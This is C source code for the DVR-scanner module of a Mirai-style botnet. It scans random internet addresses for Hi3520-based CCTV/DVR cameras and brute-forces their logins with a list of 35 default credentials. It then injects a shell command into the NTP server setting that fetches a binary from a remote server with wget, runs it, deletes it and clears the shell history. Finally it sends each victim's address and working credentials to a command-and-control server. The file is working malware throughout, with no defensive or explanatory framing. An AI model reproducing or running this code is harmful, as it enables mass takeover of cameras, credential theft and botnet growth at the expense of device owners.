#include "includes.h"
#include "dvr.h"
#include "util.h"
#include "rand.h"

#ifdef SELFREP

/* ============================================================================
 * DVR SCANNER - CCTV/DVR Camera Exploitation (Improved)
 * ============================================================================
 * Exploits Hi3520-based DVR cameras via HTTP Basic Auth + XML injection
 * Targets: CCTV/DVR cameras with /dvr/cmd or /cn/cmd endpoints
 * Method: POST with malicious NTP server configuration
 * Credentials: 35 username/password combinations
 * Payload: Downloads and executes binary via command injection
 * Global coverage: All regions with CCTV/DVR deployments
 * ============================================================================ */

#define DVR_MAX_CONNS 64
#define DVR_CONNECTION_TIMEOUT 30
#define DVR_READ_TIMEOUT 20
#define DVR_WRITE_TIMEOUT 20

/* Connection states */
#define DVR_CLOSED 0
#define DVR_CONNECTING 1
#define DVR_CHECKING_AUTH 2
#define DVR_SENDING_LOGIN 3
#define DVR_WAITING_LOGIN_RESP 4
#define DVR_SENDING_EXPLOIT 5
#define DVR_WAITING_EXPLOIT_RESP 6
#define DVR_CLEANUP 7
#define DVR_COMPLETE 8

/* Credential structure */
struct dvr_credential {
    char *username;
    char *password;
};

/* Connection structure */
struct dvr_connection {
    int fd;
    uint8_t state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    time_t last_recv;
    time_t connect_time;
    int cred_index;
    BOOL logged_in;
    char username[32];
    char password[32];
    char exploit_path[32];
    char rdbuf[4096];
    int rdbuf_pos;
};

/* DVR credentials - matches Python/Go versions */
static struct dvr_credential credentials[] = {
    {"admin", "686868"},
    {"admin", "baogiaan"},
    {"admin", "555555"},
    {"admin123", "admin123"},
    {"admin", "888888"},
    {"root", "toor"},
    {"toor", "toor"},
    {"toor", "root"},
    {"admin", "admin@123"},
    {"admin", "123456789"},
    {"root", "admin"},
    {"guest", "guest"},
    {"guest", "123456"},
    {"report", "8Jg0SR8K50"},
    {"admin", "admin"},
    {"admin", "123456"},
    {"root", "123456"},
    {"admin", "user"},
    {"admin", "1234"},
    {"admin", "password"},
    {"admin", "12345"},
    {"admin", "0000"},
    {"admin", "1111"},
    {"admin", "1234567890"},
    {"admin", "123"},
    {"admin", ""},
    {"admin", "666666"},
    {"admin", "admin123"},
    {"admin", "administrator"},
    {"administrator", "password"},
    {"admin", "p@ssword"},
    {"admin", "12345678"},
    {"root", "root"},
    {"support", "support"},
    {"user", "user"},
    {NULL, NULL}
};

/* Exploit paths */
static char *exploit_paths[] = {"/dvr/cmd", "/cn/cmd", NULL};

static struct dvr_connection conns[DVR_MAX_CONNS];
static void dvr_connect(struct dvr_connection *);
static void dvr_close(struct dvr_connection *);
static void dvr_handle_recv(struct dvr_connection *);
static ipv4_t get_random_ip(void);
static BOOL is_rfc1918(ipv4_t);
static void send_exploit(struct dvr_connection *);
static void send_cleanup(struct dvr_connection *);
static void report_success(struct dvr_connection *);
static char *base64_encode(const char *input, int input_len);

void dvr_scanner_init(void) {
    int i;

    if (fork() == 0) {
        /* Initialize connections */
        for (i = 0; i < DVR_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = DVR_CLOSED;
            conns[i].cred_index = 0;
            conns[i].logged_in = FALSE;
            conns[i].rdbuf_pos = 0;
        }

        srand(time(NULL));

        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            time_t now = time(NULL);

            FD_ZERO(&fdset);

            /* Add all active connections to fdset */
            for (i = 0; i < DVR_MAX_CONNS; i++) {
                if (conns[i].state != DVR_CLOSED) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);

            /* Check for timeouts */
            for (i = 0; i < DVR_MAX_CONNS; i++) {
                if (conns[i].state != DVR_CLOSED && 
                    (now - conns[i].last_recv > 60 || 
                     now - conns[i].connect_time > 120)) {
                    dvr_close(&conns[i]);
                }
            }

            /* Process readable sockets */
            if (nfds > 0) {
                for (i = 0; i < DVR_MAX_CONNS; i++) {
                    if (conns[i].state != DVR_CLOSED && 
                        FD_ISSET(conns[i].fd, &fdset)) {
                        dvr_handle_recv(&conns[i]);
                    }
                }
            }

            /* Start new connections */
            for (i = 0; i < DVR_MAX_CONNS; i++) {
                if (conns[i].state == DVR_CLOSED) {
                    conns[i].dst_addr = get_random_ip();
                    conns[i].dst_port = 80;
                    dvr_connect(&conns[i]);
                    break;
                }
            }

            sleep(1);
        }
    }
}

static void dvr_connect(struct dvr_connection *conn) {
    struct sockaddr_in addr;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));

    conn->state = DVR_CONNECTING;
    conn->connect_time = time(NULL);
    conn->last_recv = time(NULL);
    conn->cred_index = 0;
    conn->logged_in = FALSE;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
}

static void dvr_close(struct dvr_connection *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
    conn->state = DVR_CLOSED;
}

/* Simple base64 encoding for HTTP Basic Auth */
static char *base64_encode(const char *input, int input_len) {
    static char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static char output[256];
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    int pos = 0;

    while (input_len--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++) {
                output[pos++] = base64_table[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++) {
            char_array_3[j] = '\0';
        }

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; j < i + 1; j++) {
            output[pos++] = base64_table[char_array_4[j]];
        }

        while (i++ < 3) {
            output[pos++] = '=';
        }
    }

    output[pos] = '\0';
    return output;
}

static void dvr_handle_recv(struct dvr_connection *conn) {
    char buf[4096];
    int n;

    n = recv(conn->fd, buf, sizeof(buf), 0);
    if (n <= 0) {
        if (conn->state == DVR_COMPLETE || conn->state == DVR_CLEANUP) {
            /* Exploit sent successfully */
            if (conn->logged_in) {
                report_success(conn);
            }
        }
        dvr_close(conn);
        return;
    }

    /* Strip null bytes from response */
    int i;
    for (i = 0; i < n; i++) {
        if (buf[i] == 0x00) {
            buf[i] = 'A';
        }
    }

    conn->last_recv = time(NULL);

    /* Copy to connection buffer */
    if (conn->rdbuf_pos + n < sizeof(conn->rdbuf) - 1) {
        memcpy(conn->rdbuf + conn->rdbuf_pos, buf, n);
        conn->rdbuf_pos += n;
        conn->rdbuf[conn->rdbuf_pos] = '\0';
    }

    switch (conn->state) {
        case DVR_CONNECTING: {
            /* Check connection established */
            int err = 0;
            socklen_t err_len = sizeof(err);
            getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            
            if (err != 0) {
                dvr_close(conn);
                return;
            }

            /* Send HTTP request to check for 401 Unauthorized */
            char check_payload[512];
            int check_len = util_sprintf(check_payload,
                "GET / HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "User-Agent: Linux Gnu (cow)\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Connection: close\r\n"
                "\r\n",
                (conn->dst_addr >> 24) & 0xFF,
                (conn->dst_addr >> 16) & 0xFF,
                (conn->dst_addr >> 8) & 0xFF,
                conn->dst_addr & 0xFF);

            send(conn->fd, check_payload, check_len, 0);
            conn->state = DVR_CHECKING_AUTH;
            break;
        }

        case DVR_CHECKING_AUTH: {
            /* Check for 401 Unauthorized with Basic realm */
            if ((util_stristr(conn->rdbuf, conn->rdbuf_pos, "401 Unauthorized") ||
                 util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 401")) &&
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "Basic realm=")) {
                
                /* Vulnerable device found, try login */
                conn->cred_index = 0;
                
                /* Send first login attempt */
                if (credentials[conn->cred_index].username != NULL) {
                    char auth_str[64];
                    util_sprintf(auth_str, "%s:%s", 
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);
                    
                    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
                    
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "GET / HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Linux Gnu (cow)\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Connection: close\r\n"
                        "Authorization: Basic %s\r\n"
                        "\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        auth_base64);

                    send(conn->fd, login_payload, login_len, 0);
                    conn->state = DVR_SENDING_LOGIN;
                } else {
                    /* No credentials worked, close */
                    dvr_close(conn);
                }
            } else {
                /* Not vulnerable, close */
                dvr_close(conn);
            }
            break;
        }

        case DVR_SENDING_LOGIN:
        case DVR_WAITING_LOGIN_RESP: {
            /* Check for successful login (200 OK) */
            if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 200") ||
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.0 200")) {
                
                /* Login successful */
                conn->logged_in = TRUE;
                util_strncpy(conn->username, credentials[conn->cred_index].username, 32);
                util_strncpy(conn->password, credentials[conn->cred_index].password, 32);
                
                /* Send exploit */
                send_exploit(conn);
            } else if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "401 Unauthorized") ||
                       util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 401")) {
                
                /* Login failed, try next credential */
                conn->cred_index++;
                conn->rdbuf_pos = 0;
                memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
                
                if (credentials[conn->cred_index].username != NULL) {
                    /* Try next credential */
                    char auth_str[64];
                    util_sprintf(auth_str, "%s:%s", 
                        credentials[conn->cred_index].username,
                        credentials[conn->cred_index].password);
                    
                    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
                    
                    char login_payload[1024];
                    int login_len = util_sprintf(login_payload,
                        "GET / HTTP/1.1\r\n"
                        "Host: %d.%d.%d.%d\r\n"
                        "User-Agent: Linux Gnu (cow)\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Connection: close\r\n"
                        "Authorization: Basic %s\r\n"
                        "\r\n",
                        (conn->dst_addr >> 24) & 0xFF,
                        (conn->dst_addr >> 16) & 0xFF,
                        (conn->dst_addr >> 8) & 0xFF,
                        conn->dst_addr & 0xFF,
                        auth_base64);

                    send(conn->fd, login_payload, login_len, 0);
                } else {
                    /* No more credentials, close */
                    dvr_close(conn);
                }
            } else {
                /* Still waiting for response */
                conn->state = DVR_WAITING_LOGIN_RESP;
            }
            break;
        }

        case DVR_SENDING_EXPLOIT:
        case DVR_WAITING_EXPLOIT_RESP: {
            /* Check for successful exploit (200 OK) */
            if (util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.1 200") ||
                util_stristr(conn->rdbuf, conn->rdbuf_pos, "HTTP/1.0 200")) {
                
                /* Exploit successful, send cleanup */
                send_cleanup(conn);
            } else {
                /* Wait for response */
                conn->state = DVR_WAITING_EXPLOIT_RESP;
            }
            break;
        }

        case DVR_CLEANUP: {
            /* Cleanup sent, mark complete */
            conn->state = DVR_COMPLETE;
            if (conn->logged_in) {
                report_success(conn);
            }
            dvr_close(conn);
            break;
        }

        default:
            dvr_close(conn);
            break;
    }
}

static void send_exploit(struct dvr_connection *conn) {
    char auth_str[64];
    util_sprintf(auth_str, "%s:%s", conn->username, conn->password);
    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
    
    /* Payload command - downloads and executes binary */
    char payload_cmd[512];
    util_sprintf(payload_cmd,
        "cd /tmp || cd /run || cd /; wget http://%s/bins/axis.mips; chmod 777 axis.mips; sh axis.mips; rm -rf axis.mips; history -c",
        HTTP_SERVER);
    
    /* XML configuration with command injection in NTP server */
    char xml_payload[1024];
    util_sprintf(xml_payload,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\">"
        "<SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" "
        "encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" "
        "Interval=\"20000\" Server=\"time.nist.gov&%s;echo DONE\"/>"
        "</Service></DVR>]]></SetConfiguration></DVR>",
        payload_cmd);
    
    int cnt_len_total = 292 + util_strlen(payload_cmd);
    
    /* Try first path */
    char exploit_payload[2048];
    util_sprintf(exploit_payload,
        "POST /dvr/cmd HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Content-Length: %d\r\n"
        "Authorization: Basic %s\r\n"
        "User-Agent: Linux Gnu (cow)\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s\r\n\r\n",
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        cnt_len_total,
        auth_base64,
        xml_payload);

    send(conn->fd, exploit_payload, util_strlen(exploit_payload), 0);
    conn->state = DVR_WAITING_EXPLOIT_RESP;
    util_strncpy(conn->exploit_path, "/dvr/cmd", 32);
}

static void send_cleanup(struct dvr_connection *conn) {
    char auth_str[64];
    util_sprintf(auth_str, "%s:%s", conn->username, conn->password);
    char *auth_base64 = base64_encode(auth_str, util_strlen(auth_str));
    
    /* Clean XML configuration (remove injected command) */
    char clean_xml[512];
    util_sprintf(clean_xml,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\">"
        "<SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" "
        "encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" "
        "Interval=\"20000\" Server=\"time.nist.gov\"/>"
        "</Service></DVR>]]></SetConfiguration></DVR>");

    char cleanup_payload[1024];
    util_sprintf(cleanup_payload,
        "POST %s HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Content-Length: 281\r\n"
        "Authorization: Basic %s\r\n"
        "User-Agent: Linux Gnu (cow)\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s\r\n\r\n",
        conn->exploit_path,
        (conn->dst_addr >> 24) & 0xFF,
        (conn->dst_addr >> 16) & 0xFF,
        (conn->dst_addr >> 8) & 0xFF,
        conn->dst_addr & 0xFF,
        auth_base64,
        clean_xml);

    send(conn->fd, cleanup_payload, util_strlen(cleanup_payload), 0);
    conn->state = DVR_CLEANUP;
}

static void report_success(struct dvr_connection *conn) {
    /* Report successful compromise to C&C */
    uint8_t report[128];
    uint32_t addr = conn->dst_addr;
    uint16_t port = htons(conn->dst_port);
    int user_len = util_strlen(conn->username);
    int pass_len = util_strlen(conn->password);

    report[0] = (addr >> 24) & 0xFF;
    report[1] = (addr >> 16) & 0xFF;
    report[2] = (addr >> 8) & 0xFF;
    report[3] = addr & 0xFF;
    report[4] = (port >> 8) & 0xFF;
    report[5] = port & 0xFF;
    report[6] = (uint8_t)user_len;
    memcpy(report + 7, conn->username, user_len);
    report[7 + user_len] = (uint8_t)pass_len;
    memcpy(report + 8 + user_len, conn->password, pass_len);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) return;

    struct sockaddr_in cnc;
    cnc.sin_family = AF_INET;
    cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
    cnc.sin_port = htons(SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
        send(fd, report, 8 + user_len + pass_len, 0);
    }
    close(fd);
}

static ipv4_t get_random_ip(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target CCTV/DVR camera deployments
         * Focus: ISP networks with DVR camera installations
         * Regions: Asia, Middle East, Africa, Latin America
         */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Asia - Major DVR deployments */
        if (first_octet >= 101 && first_octet <= 125) break;
        if (first_octet >= 180 && first_octet <= 223) break;

        /* Latin America */
        if (first_octet >= 177 && first_octet <= 201) break;

        /* Europe */
        if (first_octet >= 46 && first_octet <= 95) break;

        /* Middle East */
        if (first_octet >= 80 && first_octet <= 95) break;

        /* Africa */
        if (first_octet >= 102 && first_octet <= 197) break;
    }

    return addr;
}

static BOOL is_rfc1918(ipv4_t addr) {
    uint8_t *octets = (uint8_t *)&addr;

    if (octets[0] == 10) return TRUE;
    if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return TRUE;
    if (octets[0] == 192 && octets[1] == 168) return TRUE;

    return FALSE;
}

#endif
